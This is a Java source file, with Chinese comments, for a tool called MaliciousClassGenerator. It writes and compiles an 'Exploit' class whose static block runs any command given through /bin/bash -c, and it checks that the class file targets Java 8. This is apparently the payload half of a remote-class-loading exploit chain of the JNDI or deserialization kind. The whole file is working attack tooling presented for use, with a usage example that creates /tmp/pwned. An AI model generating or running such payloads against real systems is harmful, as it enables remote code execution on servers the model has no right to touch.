package toolkit;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

/**
 * 恶意类生成器
 * 用于生成一个在静态块里执行任意命令的 Java 类 Exploit，并 javac --release 8（生成的类就等价于 Exploit.java）
 */
public class MaliciousClassGenerator {

    public static final String CLASS_NAME = "Exploit";
    //文件偏移 6-7位为字节码版本号
    private static final int JAVA8_MAJOR_VERSION = 52;

    /**
     * @param command 目标机上要执行的命令（/bin/bash -c 执行）
     * @param outDir  输出目录
     * @return        生成的 Exploit.class 文件
     */
    public static File generate(String command, String outDir) throws Exception {
        File dir = new File(outDir);
        if (!dir.exists() && !dir.mkdirs()) {
            throw new IOException("cannot create dir: " + outDir);
        }

        File javaFile = new File(dir, CLASS_NAME + ".java");
        String src = sourceTemplate(escapeJavaString(command));
        Files.write(javaFile.toPath(), src.getBytes(StandardCharsets.UTF_8));
        System.out.println("[*] wrote " + javaFile);

        // javac，必须指定为 --release 8

        ProcessBuilder pb = new ProcessBuilder(
                "javac", "--release", "8",
                "-d", dir.getAbsolutePath(),
                javaFile.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        String javacOut = readFully(p.getInputStream());
        if (p.waitFor() != 0) {
            throw new IOException("javac failed:\n" + javacOut);
        }

        File classFile = new File(dir, CLASS_NAME + ".class");
        int major = readMajorVersion(classFile);
        if (major != JAVA8_MAJOR_VERSION) {
            throw new IOException("bad class version " + major + " (need 52)");
        }
        System.out.printf("[+] %s: %d bytes, major version %d (Java 8)%n",
                classFile, classFile.length(), major);
        System.out.println("[+] payload command: " + command);
        return classFile;
    }

    /**
     * 源码模板，命令字符串已做过 Java 转义，可以安全放入字符串字面量
     */
    private static String sourceTemplate(String cmd) {
        return "public class " + CLASS_NAME + " {\n"
             + "    static {\n"
             + "        try {\n"
             + "            Runtime rt = Runtime.getRuntime();\n"
             + "            String[] cmds = {\"/bin/bash\", \"-c\", \"" + cmd + "\"};\n"
             + "            rt.exec(cmds);\n"
             + "        } catch (Exception e) {\n"
             + "            e.printStackTrace();\n"
             + "        }\n"
             + "    }\n"
             + "}\n";
    }

    /** 把命令里的反斜杠和双引号转义，避免破坏 Java 字符串字面量 */
    private static String escapeJavaString(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    /** 读 class 文件头部确定 major version（6-7） */
    static int readMajorVersion(File classFile) throws IOException {
        try (DataInputStream in = new DataInputStream(new FileInputStream(classFile))) {
            if (in.readInt() != 0xCAFEBABE) {
                throw new IOException("not a class file: " + classFile);
            }
            in.readUnsignedShort(); // minor version
            return in.readUnsignedShort(); // major version
        }
    }

    private static String readFully(InputStream in) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] tmp = new byte[4096];
        int n;
        while ((n = in.read(tmp)) > 0) {
            buf.write(tmp, 0, n);
        }
        return buf.toString("UTF-8");
    }

    public static void main(String[] args) throws Exception {
        if (args.length < 1) {
            System.err.println("usage: java MaliciousClassGenerator \"<cmd>\" [outDir]");
            System.err.println("  e.g. java MaliciousClassGenerator \"touch /tmp/pwned\" .");
            System.exit(2);
        }
        String outDir = args.length > 1 ? args[1] : ".";
        generate(args[0], outDir);
    }
}
